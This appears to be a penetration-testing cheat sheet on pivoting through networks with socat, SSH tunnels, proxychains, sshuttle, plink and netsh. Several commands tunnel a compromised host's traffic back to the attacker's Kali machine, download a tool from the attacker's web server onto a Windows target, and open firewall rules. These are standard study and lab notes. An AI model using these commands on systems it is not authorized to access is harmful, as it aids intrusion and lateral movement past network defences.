# Port Forwarding

## Linux

### Socat Port Forwarding
Via `socat`:
```bash
socat -ddd TCP-LISTEN:<port to listen on>,fork TCP:<IP to forward to>:<port to forward to>
```
Remember it is useful to select a high port to listen on (>1000), since our choice of port there is arbitrary, but we cannot have ports below 1000, as we require admin privileges to bind to those!

### SSH Local Port Forwarding
Execute this command on machine 1:
```bash
ssh -N -L 0.0.0.0:<port for machine 1 to listen on>:<machine 3 IP>:<machine 3 port> user@<machine2 IP>
```
Nb. if this command fails try spawning a shell with TTY capabilities:
```bash
python3 -c 'import pty; pty.spawn("/bin/sh")'
```
### SSH Dynamic Port Forwarding
```bash
ssh -N -D 0.0.0.0:<port for machine1 to listen on> user@<machine2 IP>
```
We omit any information about `machine3` here, since we'll handle that when we come to use the tunnel. We now make use of `Proxychains`. Before we make a connection attempt we need to replace any existing proxy information in `/etc/proxychains4.conf` with the following config info about `machine1`:
```
socks5 <machine1 IP> <port machine1 is listening on>
```
Now `machine3` is effectively reachable from our Kali host, we just need to prepend `proxychains` to the command that we'd like to run through the tunnel. Eg.
```bash
proxychains nmap -sV -sT -A <machine3 IP>
```

### SSH Remote Port Forwarding
This addresses the event where a firewall or similar network layer controls are preventing us from opening any additional ports listening for inbound traffic other than the one that our reverse shell is currently running through, but is not inhibiting traffic outbound on any port. It is similar to Local Port Forwarding, but conceptually shifted.

The tunnel we will establish will run from `machine1` as the SSH client, out port 22, to port 22 on our Kali host which is serving as the SSH server. The tunnel will then loopback from port 22 on Kali to `127.0.0.1:<local port of our choosing>`. This SSH connection will be unusual in that it will forward traffic from the server to the client. We will specify this in the command we use to establish the tunnel.

We begin by starting the SSH server on Kali:
```bash
sudo systemctl start ssh
```
We reverse the flow of traffic by specifying that this is a remote port forwarding connection via the `-R` flag (as opposed to the `-L` flag we used for the local variant):
```bash
ssh -N -R 127.0.0.1:2345:<machine2 IP>:<machine2 listening port> kali@<our IP>
```
We have now established a tunnel that is listening on `127.0.0.1:2345`, that will forward traffic via port 22 on `machine1` on to `machine2`.

### SSH Remote Dynamic Port Forwarding
This is a trivial extension of what we've seen in remote port forwarding and dynamic port forwarding. Once again we will establish a tunnel from `machine1` to our Kali host, that will then execute a loopback and listen on a specified port on our Kali host. However this time we will not specify the details of `machine2` in our original tunnel, and once again hand over to `proxychains` to facilitate a seamless tunneling experience. Nb. this time we need only specify the port for our host to loop back to, the SSH default behaviour for this command is to hit `127.0.0.1`:
```bash
ssh -N -R 2345 kali@<our IP>
```
Remembering to add the information about the listener to our `/etc/proxychains4.conf`:
```
socks5 127.0.0.1 2345
```
Now `machine2` is effectively reachable as if it weren't behind a firewall:
```bash
proxychains nmap -sV -sT -A <machine2 IP>
```

### sshuttle
This tool seems to do some of the heavy lifting from the commands above, assuming we already have port 2222 forwarding traffic to the `machine2` SSH server:
```bash
sshuttle -r user@<machine1 IP>:2222 <CIDR range 1> <CIDR range 2> ...
```

## Windows

### SSH
`ssh.exe` is a thing and work in precisely the same manner with the same flags. No need to repeat ourselves.

### Plink
Begin in the usual fashion:
```bash
sudo cp /usr/share/windows-resources/binaries/plink.exe .
python3 -m http.server 80
```
```powershell
wget -Uri http://<our IP>/plink.exe -OutFile C:\Windows\Temp\plink.exe
```
Principles are much the same, however `plink.exe` cannot do Dynamic Remote Port Forwarding \*cries in Windows\*. For a standard remote port forward:
```powershell
cmd.exe /c echo y | C:\Windows\Temp\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:2345:127.0.0.1:3389 <our IP>
```
The significance of port `3389` is that this is the RDP port, and therefore our choice of port for the traffic to loopback to once it's gone though port 22. On our Kali host `2345` will be the port serving our loopback. We can now use this to upgrade a shell to a previously firewalled off RDP session:
```bash
xfreerdp /v:127.0.0.1:2345 /u:username /p:password
```

### netsh
If we have admin on a Windows machine then we will be able to run the Windows native port forwarding tool `netsh`. For a simple port forward on a Windows `machine1`:
```powershell
netsh interface portproxy add v4tov4 listenport=<machine1 port> listenaddress=<machine1 IP> connectport=<machine2 port> connectaddress=<machine2 IP>
```
To remove when we're done:
```powershell
netsh interface portproxy del v4tov4 listenport=<machine1 port> listenaddress=<machine1 IP>
```
If there happens to be a firewall preventing us from directly connecting to the `machine1` port then `netsh` is also our friend:
```powershell
netsh advfirewall firewall add rule name="our_firewall_rule_name" protocol=TCP dir=in localip=<machine1 IP> localport=<machine1 port> action=allow
```
To remove when we're done:
```powershell
netsh advfirewall firewall delete rule name="our_firewall_rule_name"
```
